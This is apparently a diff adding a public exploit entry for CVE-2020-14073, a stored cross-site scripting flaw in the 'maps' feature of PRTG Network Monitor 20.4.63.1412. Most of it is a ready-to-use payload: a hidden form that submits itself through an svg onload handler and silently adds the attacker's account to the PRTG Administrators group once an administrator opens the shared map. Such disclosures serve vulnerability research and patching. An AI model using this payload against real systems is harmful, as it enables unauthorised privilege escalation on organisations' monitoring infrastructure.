@@ -1,0 +1,33 @@
+# Exploit Title: PRTG Network Monitor 20.4.63.1412 - 'maps' Stored XSS
+# Date: 2/12/2020
+# Exploit Author: Amin Rawah
+# Vendor Homepage: https://www.paessler.com/prtg
+# Software Link: https://www.paessler.com/prtg
+# Version: 20.4.63.1412 x64
+# Tested on: Windows 
+# CVE : CVE-2020-14073
+
+Description:
+Since there is a stored XSS affecting 'maps' in the system, a malicious user can escalte his/her privilege to PRTG Administrator.
+
+Steps:
+1- Login to PRTG system and view source code (currentUserId)
+2- Create a map, add an element, double click the element and modify the HTML section 'HTML After'
+3- In 'HTML After' add the following code:
+ <form action="http://<PRTG_SERVER>:8081/editsettings" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="name&#95;" value="PRTG&#32;Administrators" />
+      <input type="hidden" name="defaulthome&#95;" value="&#47;welcome&#46;htm" />
+      <input type="hidden" name="isadgroup" value="0" />
+      <input type="hidden" name="adusertype&#95;" value="0" />
+      <input type="hidden" name="aduserack&#95;" value="0" />
+      <input type="hidden" name="users&#95;" value="1" />
+      <input type="hidden" name="users&#95;" value="1" />
+      <input type="hidden" name="users&#95;&#95;check" value="<currentUserId>&#124;<YOUR_USERNAME>&#124;" />
+      <input type="hidden" name="users&#95;&#95;check" value="100&#124;PRTG&#32;System&#32;Administrator&#124;" />
+      <input type="hidden" name="id" value="200" />
+      <input type="hidden" name="targeturl" value="&#47;systemsetup&#46;htm&#63;tabid&#61;6" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <svg/onload='document.forms[0].submit()'/>  
+4- Save and share the link with PRTG Administrator.
+5- Login with the highest privilege.
